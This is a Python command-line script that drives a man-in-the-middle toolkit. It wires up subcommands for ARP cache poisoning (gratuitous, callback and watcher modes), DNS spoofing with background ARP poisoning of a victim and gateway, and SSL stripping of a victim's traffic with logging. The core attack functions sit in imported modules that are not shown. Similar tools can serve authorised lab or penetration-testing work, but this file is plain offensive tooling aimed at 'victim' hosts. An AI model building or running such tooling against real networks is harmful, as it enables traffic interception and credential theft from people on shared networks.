import sys, argparse, time, psutil, threading
import arp_poison as arp
import ssl_strip as ssl
import dns_poison as dns
#from scapy.all import sendp, ARP, Ether

def arp_poison():
    if args.attack_type == 'gratuitous':
        arp.grat_arp_poison(args.iface, args.target_ip, args.spoof_ip)
    elif args.attack_type == 'callback':
        arp.arp_poison_callback(args.iface, args.target_ip if hasattr(args, 'target_ip') else 0, args.spoof_ip if hasattr(args, 'spoof_ip') else 0)
    elif args.attack_type == 'watcher':
        arp.apr_wacher(args.iface)
    return

def dns_spoof():
    if (args.debug):
        dns.debug(args)
    if args.target_ip and args.gateway_ip:
        print(f"[*] Starting background ARP poisoning: {args.target_ip} <-> {args.gateway_ip}")
        t = threading.Thread(target=arp.grat_arp_poison, args=(args.iface, args.target_ip, args.gateway_ip), daemon=True)
        t.start()
    dns.run_dns_spoof(args.iface, args.target_ip, args.hosts_file)
    return

def ssl_strip():
    # Create config object from global args
    config = ssl.SSLStripConfig(
        iface=args.iface,
        victim_ip=args.target_ip,
        gateway_ip=args.gateway_ip,
        listen_port=args.listen_port,
        mode='sniff', # Default mode
        log_file=args.log_file
    )
    ssl.run_ssl_strip(config)
    return

parser = argparse.ArgumentParser()
subparsers = parser.add_subparsers(dest='attack')

parser_arp = subparsers.add_parser('arp-poison', aliases=['arp'])
ifaces = [iface for iface in psutil.net_if_addrs().keys()]
parser_arp.add_argument('-i', '--iface', choices=ifaces, required=True, help='')
subparsers_arp = parser_arp.add_subparsers(dest='attack_type')
parser_arp_grat = subparsers_arp.add_parser('gratuitous')
parser_arp_grat.add_argument('-t', '--target_ip', required=True)
parser_arp_grat.add_argument('-s', '--spoof_ip', required=True)
parser_arp_grat = subparsers_arp.add_parser('callback')
parser_arp_grat.add_argument('-t', '--target_ip')
parser_arp_grat.add_argument('-s', '--spoof_ip')
parser_arp_grat = subparsers_arp.add_parser('watcher')
parser_arp.set_defaults(func=arp_poison)

parser_dns = subparsers.add_parser('dns-spoof', aliases=['dns'])
parser_dns.add_argument('-i', '--iface', required=True, help='Interface to listen on')
parser_dns.add_argument('-t', '--target_ip', help='Only spoof this client IP')
parser_dns.add_argument('-f', '--hosts_file', default='dns-file.txt', help='Host mapping file')
parser_dns.add_argument('-g', '--gateway_ip', help='Gateway IP for ARP poisoning')
parser_dns.add_argument("-d", "--debug", action="store_true", help="Debug mode")
parser_dns.set_defaults(func=dns_spoof)

parser_ssl = subparsers.add_parser('ssl-strip', aliases=['ssl'])
parser_ssl.add_argument('-i', '--iface', required=True, help='Network interface')
parser_ssl.add_argument('-t', '--target_ip', required=True, help='Victim IP address')
parser_ssl.add_argument('-g', '--gateway_ip', required=True, help='Gateway IP address')
parser_ssl.add_argument('-p', '--listen_port', type=int, default=8080, help='Port to listen on (if using proxy mode)')
parser_ssl.add_argument('-l', '--log_file', help='Log file path')
parser_ssl.set_defaults(func=ssl_strip)

args = parser.parse_args()

if hasattr(args, 'func'):
    args.func()
